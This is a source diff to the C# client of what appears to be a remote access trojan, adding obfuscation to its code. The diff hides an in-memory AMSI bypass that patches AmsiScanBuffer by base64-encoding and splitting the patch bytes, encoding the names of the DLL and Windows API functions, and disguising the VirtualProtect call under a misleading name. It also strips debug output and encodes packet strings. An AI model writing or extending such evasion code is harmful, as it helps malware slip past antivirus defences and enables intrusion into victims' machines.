@@ -13,6 +13,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Text;
 
 namespace Client.Connection
 {
@@ -83,7 +84,7 @@ namespace Client.Connection
 
                 if (TcpClient.Connected)
                 {
-                    Debug.WriteLine("Connected!");
+                    //Debug.WriteLine("Connected!");
                     IsConnected = true;
                     SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                     SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
@@ -105,7 +106,7 @@ namespace Client.Connection
             }
             catch
             {
-                Debug.WriteLine("Disconnected!");
+                //Debug.WriteLine("Disconnected!");
                 IsConnected = false;
                 return;
             }
@@ -155,7 +156,7 @@ namespace Client.Connection
                     if (HeaderSize == 0)
                     {
                         HeaderSize = BitConverter.ToInt32(Buffer, 0);
-                        Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
+                        //Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                         if (HeaderSize > 0)
                         {
                             Offset = 0;
@@ -226,7 +227,7 @@ namespace Client.Connection
 
                     if (msg.Length > 1000000) //1mb
                     {
-                        Debug.WriteLine("send chunks");
+                        //Debug.WriteLine("send chunks");
                         using (MemoryStream memoryStream = new MemoryStream(msg))
                         {
                             int read = 0;
@@ -357,7 +358,7 @@ namespace Client.Connection
         private static void Received() //reset client forecolor
         {
             MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Pac_ket").AsString = "Received";
+            msgpack.ForcePathObject("Pac_ket").AsString = Encoding.Default.GetString(Convert.FromBase64String("UmVjZWl2ZWQ="));//"Received"
             ClientSocket.Send(msgpack.Encode2Bytes());
             Thread.Sleep(1000);
         }
@@ -373,26 +374,28 @@ namespace Client.Connection
     public class Amsi
     {
         // https://twitter.com/_xpn_/status/1170852932650262530
-        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-
         public static void Bypass()
         {
+            string x64 = "uFcA";
+            x64 = x64 + "B4DD";
+            string x86 = "uFcAB4";
+            x86 = x86 + "DCGAA=";
             if (is64Bit())
-                PatchAmsi(x64);
+                PatchA(Convert.FromBase64String(x64));
             else
-                PatchAmsi(x86);
+                PatchA(Convert.FromBase64String(x86));
         }
-
-        private static void PatchAmsi(byte[] patch)
+        private static void PatchA(byte[] patch)
         {
             try
             {
-                var lib = Win32.LoadLibrary("amsi.dll");
-                var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");
+                string liba = Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw="));
+                var lib = Win32.LoadLibraryA(ref liba);//Amsi.dll
+                string addra = Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="));
+                var addr = Win32.GetProcAddress(lib, ref addra);//AmsiScanBuffer
 
                 uint oldProtect;
-                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
+                Win32.VirtualAllocEx(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
 
                 Marshal.Copy(patch, 0, addr, patch.Length);
             }
@@ -416,13 +419,20 @@ namespace Client.Connection
 
     class Win32
     {
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        public static readonly DelegateVirtualProtect VirtualAllocEx = LoadApi<DelegateVirtualProtect>("kernel32", Encoding.Default.GetString(Convert.FromBase64String("VmlydHVhbFByb3RlY3Q=")));//VirtualProtect
 
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
+        public delegate int DelegateVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        #region CreateAPI
+        [DllImport("kernel32", SetLastError = true)]
+        public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
+        public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
+        public static CreateApi LoadApi<CreateApi>(string name, string method)
+        {
+            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
+        }
+        #endregion
     }
 }
